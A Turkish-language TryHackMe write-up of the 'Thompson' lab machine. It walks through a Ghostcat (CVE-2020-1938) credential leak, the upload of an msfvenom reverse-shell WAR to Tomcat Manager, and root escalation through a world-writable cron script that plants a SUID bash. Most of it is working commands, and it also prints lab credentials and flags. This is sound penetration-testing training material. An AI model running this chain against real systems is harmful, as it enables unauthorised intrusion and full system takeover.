# Thompson - TryHackMe Writeup

## Recon

Her zamanki gibi ilk adımda hedef sistemi enumerate etmek için tam port taraması gerçekleştiriyorum.

```bash
nmap -sS -sC -sV -p- 10.112.189.252
```

Tarama sonucunda dikkatimi çeken servisler şunlar oldu:

- SSH
- Apache Tomcat 8.5.5
- AJP (8009)

Tomcat sürümünü gördükten sonra Exploit-DB üzerinde araştırma yaptım.

```bash
searchsploit Apache Tomcat 8.5.5
```

Doğrudan kullanılabilir bir exploit bulamadım. Bunun üzerine açık olan **8009/AJP** portuna odaklandım.

<img width="898" height="373" alt="nmap1" src="https://github.com/user-attachments/assets/1d9bd011-06e8-40f7-9c70-229c316f12a0" />

---

## Ghostcat (CVE-2020-1938)

AJP portunun açık olması Ghostcat zafiyetini aklıma getirdi.

Metasploit üzerinde ilgili modülü kullanarak hedefi test ettim.

```bash
msfconsole

use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.112.189.252
run
```

Modül başarılı şekilde çalıştı ve aşağıdaki dizine bir dosya kaydetti.

```text
/root/.msf4/loot/
```

Dosyayı incelediğimde aşağıdaki credential bilgilerine ulaştım.

```bash
cat /root/.msf4/loot/*.txt
```

```text
skyfuck:8730281lkjlkjdqlksalks
```



---

## Tomcat Manager

İlk olarak bu credential ile SSH erişimini denedim.

```bash
ssh skyfuck@10.112.189.252
```

Ancak giriş başarısız oldu.

Bunun üzerine web tarafını incelemeye karar verdim.

Gobuster ile dizin taraması gerçekleştirdim.

```bash
gobuster dir \
-u http://10.112.189.252:8080 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="556" height="58" alt="dizin" src="https://github.com/user-attachments/assets/ad948527-be0d-4514-ba61-40fb46ac3078" />

Tarama sonucunda aşağıdaki dizin dikkatimi çekti.

```text
/manager
```

Manager paneline eriştiğimde HTTP Basic Authentication ekranı ile karşılaştım.

Ghostcat üzerinden elde ettiğim credential bilgilerini kullanarak giriş yapmayı başardım.

<img width="1919" height="446" alt="site+zip" src="https://github.com/user-attachments/assets/e711b2a1-b155-4e9e-8a5d-f0bc1cf602e0" />

---

## Initial Access

Tomcat Manager yalnızca **WAR** dosyalarının yüklenmesine izin veriyor.

Bu nedenle `msfvenom` ile Java reverse shell oluşturdum.

```bash
msfvenom \
-p java/jsp_shell_reverse_tcp \
LHOST=192.168.154.242 \
LPORT=4444 \
-f war \
-o shell.war
```

Daha sonra Metasploit üzerinde handler başlattım.

```bash
msfconsole -q

use exploit/multi/handler

set payload java/jsp_shell_reverse_tcp
set LHOST 192.168.154.242
set LPORT 4444

run
```

Ardından oluşturduğum `shell.war` dosyasını Tomcat Manager üzerinden upload ettim.

Uygulamayı çalıştırdığım anda reverse shell bağlantısı geldi.

![Reverse Shell](images/reverse-shell.png)

---

## TTY Upgrade

İlk shell oldukça kısıtlıydı.

Daha rahat çalışabilmek için TTY upgrade gerçekleştirdim.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm-256color
```

---

## User Flag

Jack kullanıcısının dizinine geçtim.

```bash
cd /home/jack

ls
```

İlk flag burada bulunuyordu.

```bash
cat user.txt
```

```text
39400c90bc683a41a8935e4719f181bf
```

---

## Privilege Escalation

Dizin içerisinde dikkatimi çeken dosya:

```text
id.sh
```

Dosya izinlerini kontrol ettim.

```bash
ls -l id.sh
```

```text
-rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh
```

Dosyanın herkes tarafından yazılabilir olduğunu gördüm.

İlk etapta bunun gerçekten root tarafından çalıştırılıp çalıştırılmadığını doğrulamak istedim.

Scripti aşağıdaki şekilde değiştirdim.

```bash
cat > /home/jack/id.sh << EOF
#!/bin/bash
id > /home/jack/test.txt
date >> /home/jack/test.txt
EOF
```

Daha sonra sistem cron görevlerini kontrol ettim.

```bash
cat /etc/crontab
```

En kritik satır şuydu:

```text
* * * * * root cd /home/jack && bash id.sh
```

Bu cron görevi her dakika `id.sh` dosyasını **root** olarak çalıştırıyordu.

Dosya da yazılabilir olduğundan privilege escalation mümkün hale gelmişti.

Scripti aşağıdaki payload ile değiştirdim.

```bash
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash' > /home/jack/id.sh
```

Yaklaşık bir dakika bekledikten sonra oluşan dosyayı kontrol ettim.

```bash
ls -l /tmp/rootbash
```

```text
-rwsr-xr-x 1 root root ...
```

Artık root shell elde etmek için aşağıdaki komutu çalıştırmam yeterliydi.

```bash
/tmp/rootbash -p
```

---

## Root Flag

Root yetkisini aldıktan sonra son flag'i okudum.

```bash
cd /root

cat root.txt
```

```text
d89d5391984c0450a95497153ae7ca3a
```

![Root](images/root.png)

---

# Lessons Learned

Bu makinede zincir şu şekilde ilerledi:

1. Nmap ile AJP (8009) servisinin keşfi.
2. Ghostcat (CVE-2020-1938) kullanılarak credential elde edilmesi.
3. Tomcat Manager paneline erişim.
4. WAR dosyası yüklenerek initial shell alınması.
5. TTY upgrade.
6. World-writable ve root tarafından çalıştırılan cron scriptinin tespit edilmesi.
7. SUID bash oluşturularak root yetkisinin elde edilmesi.

Bu oda, özellikle aşağıdaki konular üzerinde pratik yapmak için oldukça faydalıydı:

- Apache Tomcat Enumeration
- Ghostcat (CVE-2020-1938)
- Tomcat Manager Abuse
- WAR Deployment
- Reverse Shell
- Linux TTY Upgrade
- Cron Job Privilege Escalation
- SUID Exploitation
